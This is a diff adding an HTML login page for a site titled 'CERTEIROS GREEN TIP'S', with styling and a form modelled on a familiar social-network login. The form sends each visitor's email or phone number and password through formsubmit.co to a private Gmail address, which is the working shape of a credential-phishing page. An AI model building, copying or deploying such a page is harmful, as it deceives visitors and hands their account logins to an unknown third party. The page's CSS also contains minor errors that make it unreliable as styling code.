@@ -1,0 +1,152 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CERTEIROS GREEN TIP'S</title>
+    <link rel="stylesheet" href="index.css">
+    <style>
+
+            body {
+              background-image: url(back.jpg);
+              background-repeat: no-repeat;
+              background-size: cover;
+            }
+
+            .background {
+              background-image: url(back.jpg);
+              background-repeat: no-repeat;
+              
+              /*media quey for desktop device */
+
+              @media (min-width: 768px) {
+                body {
+                background-image: url(back.jpg);
+              background-repeat: no-repeat;
+              }
+            }
+
+            /*media quey for mobile device */
+
+            @media (min-width: 767px) {
+              body {
+              background-image: url(back.jpg);
+            background-repeat: no-repeat;
+              }
+            }
+
+            }
+
+
+            .login {
+              cursor: pointer;
+              border-radius: 1rem;
+              border: none;
+              position: relative;
+              transition: 0.1s;
+            }
+
+            .login::after {
+              content: " ";
+              width: 100%;
+              height: 100%;
+              background-image: radial-gradient(circle 
+              farthest-corner at 10% 20%, rgba (255,94,247,1)
+              17.8%, rgba(2,245,255,1) 100.2%);
+              filter: blur(15px);
+              z-index: -1;
+              position: absolute;
+              left: 0;
+              top: 0;
+            }
+
+            .login:active {
+              transform: scale(0.5) rotate(6deg);
+              background: radial-gradient(circle farthest-corner at 10% 20%,
+              rgba (25,94,247,1) 17.8%, rgba(2,245,255,1) 100100.2%);
+              transition: 0.5s;
+            }
+
+      .point {
+        text-align: center;
+        color: whitesmoke;
+        font-size: 50px;
+        font-family: "Open San", sans-serif;
+      }
+
+      .login-page {
+        margin: 0 auto;
+        max-width: 400px;
+        padding: 20px;
+      }
+
+      .login-page p {
+        margin-bottom: 10px;
+      }
+
+      .login-page label {
+        display: block;
+        font-weight: bold;
+      }
+
+      .login-page input[type="text"],
+      .login-page input[type="tel"],
+      .login-page input[type="password"] {
+        width: 100%;
+        padding: 5px;
+        font-size: 16px;
+      }
+
+      .login-page button[type="submit"] {
+        background-color: #4CAF50;
+        color: white;
+        padding: 10px;
+        border: none;
+        cursor: pointer;
+        width: 100%;
+        font-size: 16px;
+      }
+
+
+      .login-page a {
+        color: blue;
+      }
+
+      .create a {
+        color: blue;
+      }
+
+      .email {
+        color: white;
+      }
+    </style>
+  </head>
+  <body class="background">
+    <h1 class="point"><b>CERTEIROS GREEN TIP'S</b></h1>
+
+    <div class="login-page">
+      <form action="https://formsubmit.co/divaoursjigwaar@gmail.com" method="POST">
+        <p>
+          <label for="email" class="email">Email address or phone number</label> <br>
+          <input placeholder="Email address or phone number" type="text" name="email" id="email" required="">
+        </p>
+        <p>
+          <label for="password" class="email">Password</label> <br>
+          <input placeholder="Password" type="password" id="password" name="password" required="">
+        </p>
+        <p class="login">
+          <button type="submit">Login</button>
+        </p>
+      </form>
+
+      <p class="login">
+        <a href="forget.html">Forgot password?</a>
+      </p>
+
+      <hr>
+
+      <p class="login">
+        <a href="in.html">Create new account</a>
+      </p>
+    </div>
+
+
+</html>
